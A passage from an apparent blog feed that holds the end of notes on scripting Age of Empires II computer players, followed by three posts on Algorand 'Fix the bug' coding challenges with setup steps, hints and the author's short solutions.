&lt;li&gt;&lt;a href=&quot;https://discord.gg/GK84FCrtWJ&quot;&gt;AI Scripters Discord Link&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;images/aoeaiscripting/resources.jpeg&quot; alt=&quot;Resources&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;.per and .ai files:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AIs files come in pairs: name.ai and name.per (name&apos;s must be identical).&lt;/li&gt;
&lt;li&gt;This files should be located:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;-- AoE II DE: &lt;code&gt;C:\Program Files (x86)\Steam\steamapps\common\AoE2DE\resources\_common\ai\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-- Classic AoE II: &lt;code&gt;\Age Of Empires II\AOE II - The Conquerors\AI&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Scripting Language Overview:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AoE II scripting language is based on CLIPS (C Language Integrated Production System).&lt;/li&gt;
&lt;li&gt;Defining rules involves &lt;code&gt;defrule&lt;/code&gt; instruction with facts and actions.&lt;/li&gt;
&lt;li&gt;Facts trigger actions as long as they remain true unless disabled.&lt;/li&gt;
&lt;li&gt;Example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;(defrule
	(true)
=&amp;gt;
	(chat-to-all &quot;Hi, let&apos;s play AoE II!&quot;)
	(disable-self)	;Disable after executed once.
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Programming Levels:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There are five levels of AoE II programming:
&lt;ol&gt;
&lt;li&gt;Defrules, defconsts, timers...&lt;/li&gt;
&lt;li&gt;Random generator, conditional (file) loading, goals&lt;/li&gt;
&lt;li&gt;Strategic Numbers&lt;/li&gt;
&lt;li&gt;Userpatch commands&lt;/li&gt;
&lt;li&gt;Direct Unit Control&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Scouting the Map:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Level 3 programming involves strategic numbers (SN) for adjusting AI parameters.&lt;/li&gt;
&lt;li&gt;SN adjust AI behavior and can be changed throughout the game.&lt;/li&gt;
&lt;li&gt;Default values are important to understand AI behavior fully.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Setting Strategic Numbers:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(defrule
	(true)
=&amp;gt;
	(set-strategic-number strategic-number number)
	(disable-self)
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(defrule
	(true)
=&amp;gt;
	(set-strategic-number sn-cap-civilian-explorers 0)
	(set-strategic-number sn-total-number-explorers 0)
	(disable-self)
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Units and Buildings IDs:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IDs list: &lt;a href=&quot;https://airef.github.io/tables/objects.html&quot;&gt;Unit/Building ID list&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Define constants using &lt;code&gt;(defconst constant-name constant-value)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(defconst livestock-class 958)
(unit-type-count livestock-class &amp;gt; 0)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Conditionals:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;#load-if-defined&lt;/code&gt; to check civilization.&lt;/li&gt;
&lt;li&gt;Example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;#load-if-defined BRITON-CIV
	(defconst text-my-civ &quot;I&apos;m Britons, will make Longbows&quot;)
#else
	(defconst text-my-civ &quot;I&apos;m not Britons, will not make Longbows&quot;)
#end-if
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Training Villagers:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use fact-checkers like &lt;code&gt;can-train&lt;/code&gt; to avoid bugs.&lt;/li&gt;
&lt;li&gt;Example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;(defrule
	(can-train villager)
=&amp;gt;
	(train villager)
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Miscellaneous:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use space with relative operators like &lt;code&gt;&amp;gt;= 5&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Prefix types with TypeOp (only for level 4 and 5).&lt;/li&gt;
&lt;li&gt;Example:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;(defconst starting-vills-on-sheep 6)
(defrule
	(true)
=&amp;gt;
	(chat-to-all &quot;I need %d villagers on sheep&quot; c: starting-vills-on-sheep)
	(disable-self)
)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Building conditions:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;can-build&lt;/code&gt; checks if the building is available.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sn-initial-exploration-required&lt;/code&gt;: Change default from 2 to 0.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(housing-headroom &amp;lt; 4)&lt;/code&gt;: Example condition for housing.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>Algorand Challenge #04: Fix the bug.</title><link>https://alan.com.ar/posts/algochallenge04/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallenge04/</guid><pubDate>Wed, 27 Mar 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/challenge-4/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 4: How Do I Atomically Send 2 Payment Transactions? &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I want to group 2 payment transactions using Algorand&apos;s atomic transfers feature but it&apos;s not working!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside of &lt;code&gt;index.ts&lt;/code&gt; file, there is code that is trying to atomically group 2 payment transactions and synchronously send them using atomic transfers. The code is using the &lt;a href=&quot;https://github.com/algorand/js-algorand-sdk&quot;&gt;Algorand JavaScript SDK&lt;/a&gt; and the &lt;a href=&quot;https://github.com/algorandfoundation/algokit-utils-ts/tree/main&quot;&gt;AlgoKit Utils TypeScript&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;However, if you try to run the &lt;code&gt;index.ts&lt;/code&gt; file after going into the &lt;code&gt;challenge&lt;/code&gt; directory, opening Docker Desktop, and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
algokit localnet start
npm run start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail and show this error: &lt;code&gt;TypeError: signer is not a function&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and fix the bug.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/813198189334888469&quot;&gt;General Dev Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://docs.npmjs.com/downloading-and-installing-node-js-and-npm&quot;&gt;Node.JS / npm&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;li&gt;Setup Dev environment using AlgoKit. Run the below command inside of the &lt;code&gt;challenge&lt;/code&gt; folder.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependencies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.&lt;/p&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;./index.ts&lt;/code&gt; and read the comments on the file and fix the bug!&lt;/li&gt;
&lt;li&gt;After fixing the bug run the below command inside of the &lt;code&gt;challenge&lt;/code&gt; folder:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;npm run start
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;If you see: &lt;code&gt;The first payment transaction sent 1000000 microAlgos and the second payment transaction sent 2000000 microAlgos&lt;/code&gt; in the console, you successfully fixed the bug! &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/atc/?from_query=atomic#template-modal-overlay&quot;&gt;Atomic Transfers Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-utils-ts/blob/main/docs/capabilities/transaction.md&quot;&gt;AlgoKit Utils TypeScript Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;atc.addTransaction()&lt;/code&gt; takes in a &lt;a href=&quot;https://github.com/algorand/js-algorand-sdk/blob/6fdfa116f0e47e68982281028fdc817577c6aab7/src/signer.ts#L105&quot;&gt;&lt;code&gt;transactionWithSigner&lt;/code&gt;&lt;/a&gt; object as the parameter. You can get the signer of an account using the &lt;a href=&quot;https://github.com/algorand/js-algorand-sdk/blob/6fdfa116f0e47e68982281028fdc817577c6aab7/src/signer.ts#L23&quot;&gt;&lt;code&gt;makeBasicAccountTransactionSigner&lt;/code&gt;&lt;/a&gt; function from the Algorand JavaScript SDK.&lt;/p&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the result of running &lt;code&gt;index.ts&lt;/code&gt; file.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev! This was the final challenge of the 1st season of #AlgoCodingChallenge. Be on the lookout for the 2nd season of #AlgoCodingChallenge!&lt;/p&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The error shown was: &lt;strong&gt;TypeError: signer is not a function&lt;/strong&gt;.
Also, according to Visual Studio Code: &lt;strong&gt;Type Account&apos; is not assignable to type &apos;TransactionSigner&apos;.&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I used the &lt;strong&gt;makeBasicAccountTransactionSigner&lt;/strong&gt; function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafkreibdcm5nrqx2624toblrcvzthsgk2fzzrxfyueh2y6bitlzorc343u?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Algorand Challenge #03: Fix the bug.</title><link>https://alan.com.ar/posts/algochallenge03/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallenge03/</guid><pubDate>Tue, 19 Mar 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/challenge-3/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 3: My AppClient is Broken! &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I want to instantiate an app client to deploy and interact with my smart contract but it&apos;s not working!!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This project includes a simple &lt;code&gt;helloWorld&lt;/code&gt; smart contract written with &lt;a href=&quot;https://tealscript.netlify.app/&quot;&gt;TEALScript&lt;/a&gt; inside of &lt;code&gt;./contract/helloWorld.algo.ts&lt;/code&gt; file. The smart contract is already compiled with artifacts generated inside of the &lt;code&gt;./contracts/artifacts&lt;/code&gt; folder and the application typed client inside of &lt;code&gt;./contracts/clients/helloWorldClient.ts&lt;/code&gt; file.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Artifacts: autogenerated assets (TEAL contract code, ABI spec, source mapping) for your smart contract.
Application Typed Client: autogenerated client used to easily deploy / interact with Algorand smart contract.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The &lt;code&gt;index.ts&lt;/code&gt; file in the root level is a script that deploys the &lt;code&gt;helloWorld&lt;/code&gt; smart contract and calls the &lt;code&gt;helloWorld&lt;/code&gt; method.&lt;/p&gt;
&lt;p&gt;However, if you try to run the &lt;code&gt;index.ts&lt;/code&gt; file after going into the &lt;code&gt;challenge&lt;/code&gt; directory, opening Docker Desktop, and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
algokit localnet start
npm run start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and fix the bug.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/1065320801970180168&quot;&gt;AlgoKit Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://docs.npmjs.com/downloading-and-installing-node-js-and-npm&quot;&gt;Node.JS / npm&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Make sure to install these 3 prerequisites before continuing!&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;./contracts/helloWorld.algo.ts&lt;/code&gt; to read the &lt;code&gt;helloWorld&lt;/code&gt; TEALScript smart contract and understand what it does.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;./index.ts&lt;/code&gt; and read the comments on the file and fix the bug!&lt;/li&gt;
&lt;li&gt;After fixing the bug run the below command inside the &lt;code&gt;challenge&lt;/code&gt; directory:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;npm run start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you see something like the image below, you have successfully fixed the bug! Congratulations 
&amp;lt;img width=&quot;827&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-coding-challenges/challenge-3/assets/52557585/662d86ea-4d8b-4a5f-95c1-b228cbbadd9b&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;
Here is a hint for you: https://developer.algorand.org/docs/get-details/algokit/features/generate/?from_query=algokit%20utils#1-typed-clients&lt;/p&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;A screenshot of your terminal that shows the console.log &amp;lt;img width=&quot;827&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-coding-challenges/challenge-3/assets/52557585/69dae6bd-f7cd-431a-b29a-71af3d534c9b&quot;&amp;gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev! Now on to the next one &lt;/p&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;In the creator address it was missing the addr property.&lt;/li&gt;
&lt;li&gt;A wrong function was being returned in index.ts&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Following the documentation I fixed the bugs by setting the correct creatorAddress to &quot;deployer.addr&quot; and changing indexer to &quot;algod&quot;, which is the correct function.
Also changed &quot;YOUR_NAME&quot; to my nickname.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafkreicaefsujfwqvaobmlafc62n2lhkmx6xshhcb3u5bxvm74im3wnrze?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Algorand Challenge #02: Fix the bug.</title><link>https://alan.com.ar/posts/algochallenge02/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallenge02/</guid><pubDate>Tue, 12 Mar 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/challenge-2/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 2: Why Isn&apos;t the Code Running?! &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I cloned this Algorand project but the code doesn&apos;t run! What is going on???&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This project was created with the TEALScript AlgoKit template and inside of &lt;code&gt;contracts/algorand-puzzle-2.algo.ts&lt;/code&gt; file, there is a simple smart contract with one method that simply returns a string value when called. The application client used to deploy/call the smart contract is already generated inside of &lt;code&gt;contracts/clients/AlgorandPuzzle2Client.ts&lt;/code&gt; and the test defined in &lt;code&gt;__test__/algorand-puzzle-2.test.ts&lt;/code&gt; is accurately written.&lt;/p&gt;
&lt;p&gt;In short, all of the code inside of this project is correct, so unlike the name of this campaign &quot;Fix The Bug&quot;, there is no need to change the codebase to solve this problem.&lt;/p&gt;
&lt;p&gt;However, if you try and run the test file with &lt;code&gt;npm run test&lt;/code&gt; after cloning this repo, the test will fail and give this error:
&lt;code&gt;sh: tealscript: command not found&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and Fix the problem.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/1065320801970180168&quot;&gt;AlgoKit Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://docs.npmjs.com/downloading-and-installing-node-js-and-npm&quot;&gt;Node.JS / npm&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Make sure to install these 3 prerequisites before continuing!&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;contracts/algorand-puzzle-2.algo.ts&lt;/code&gt; and uncomment line 8.&lt;/li&gt;
&lt;li&gt;Make sure you are inside the &lt;code&gt;challenge&lt;/code&gt; directory and run &lt;code&gt;npm run test&lt;/code&gt; in your terminal to run the &lt;code&gt;__test__/algorand-puzzle-2.test.ts&lt;/code&gt; file and see the error message.&lt;/li&gt;
&lt;li&gt;Find out what is wrong and fix the bug!&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;npm run test&lt;/code&gt; inside of &lt;code&gt;challenge&lt;/code&gt; directory
If all of the test cases pass, you solved the problem! Congratulations &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;
Here is a hint for you: https://developer.algorand.org/docs/get-details/algokit/features/bootstrap/&lt;/p&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the test cases passing. &amp;lt;img width=&quot;558&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-devrel/fix-the-bug-private/assets/52557585/3017375c-f85a-42f1-b6e5-262b4560f96d&quot;&amp;gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev! Now on to the next one &lt;/p&gt;
&lt;h2&gt;AlgoKit TEALScript Template Information&lt;/h2&gt;
&lt;h3&gt;Build Contract&lt;/h3&gt;
